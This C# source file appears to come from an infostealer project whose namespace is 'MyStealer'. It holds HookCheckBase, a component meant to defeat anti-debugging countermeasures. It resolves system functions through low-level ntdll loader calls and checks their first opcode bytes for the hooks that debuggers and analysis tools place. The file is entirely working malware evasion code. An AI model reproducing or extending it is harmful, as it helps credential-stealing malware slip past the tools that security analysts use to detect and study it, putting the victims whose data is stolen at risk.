using System;
using System.Runtime.InteropServices;
using static MyStealer.AntiDebug.Win32Calls;

namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal abstract class HookCheckBase : CheckBase
    {
        protected abstract string ModuleName { get; }

        protected abstract string[] ProcNames { get; }

        protected abstract byte[] BadOpCodes { get; }

        public override bool CheckPassive()
        {
            var handle = LowLevelGetModuleHandle(ModuleName);
            try
            {
                foreach (var proc in ProcNames)
                {
                    var procAddr = LowLevelGetProcAddress(handle, proc);
                    var ops = new byte[1];
                    Marshal.Copy(procAddr, ops, 0, 1);

                    foreach (var badOps in BadOpCodes)
                    {
                        if (ops[0] == badOps)
                            return true;
                    }
                }
            }
            catch
            {
                // ignored
            }

            return false;
        }

        private static IntPtr LowLevelGetModuleHandle(string Library)
        {
            var hModule = IntPtr.Zero;
            RtlInitUnicodeString(out var str, Library);
            LdrGetDllHandle(null, null, str, ref hModule);
            return hModule;
        }

        private static IntPtr LowLevelGetProcAddress(IntPtr hModule, string Function)
        {
            RtlInitUnicodeString(out var ustr, Function);
            RtlUnicodeStringToAnsiString(out var astr, ustr, true);
            LdrGetProcedureAddress(hModule, astr, 0, out var handle);
            return handle;
        }
    }
}
